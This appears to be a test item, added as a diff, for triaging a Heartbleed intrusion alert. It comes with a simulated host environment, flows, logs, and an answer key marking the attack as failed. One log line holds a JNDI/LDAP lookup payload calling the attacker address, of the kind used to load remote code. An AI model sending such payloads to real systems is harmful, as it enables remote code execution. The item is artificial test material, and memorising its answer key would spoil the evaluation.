@@ -1,0 +1,78 @@
+{
+  "id": "A-1027",
+  "alert": {
+    "src": "203.0.113.238",
+    "dst": "10.2.4.233",
+    "dst_port": 443,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT Heartbleed Data Leak",
+    "claimed_cve": "CVE-2014-0160",
+    "severity": "medium",
+    "ts": "2026-09-17T08:16:00Z",
+    "flow_id": "f2235"
+  },
+  "world": {
+    "assets": {
+      "10.2.4.233": {
+        "host": "host-10-2-4-233",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "443": {
+            "product": "openssl",
+            "version": "1.0.2"
+          }
+        },
+        "peers": [
+          "10.2.1.176"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2014-0160": {
+        "product": "openssl",
+        "patched_in": "1.0.1g",
+        "exploit_maturity": "poc"
+      }
+    },
+    "flows": {
+      "f2235": {
+        "direction": "inbound",
+        "bytes_out": 128,
+        "bytes_in": 340,
+        "duration_s": 1,
+        "state": "RST",
+        "note": "connection reset, no data exfil"
+      }
+    },
+    "logs": {
+      "host-10-2-4-233": [
+        "[host-10-2-4-233] 443 POST /api/x 403 jndi:ldap://203.0.113.238/a  <- payload rejected",
+        "[host-10-2-4-233] no new child processes"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-4-233": {
+        "suspicious": false,
+        "tree": "java (steady state, no children)",
+        "persistence": null
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.238",
+        "dst": "10.2.4.233",
+        "port": 443,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "FAILED",
+    "action": "monitor"
+  },
+  "adversarial": false,
+  "solve_rationale": "target patched above patched_in; payload rejected; RST, no exfil"
+}
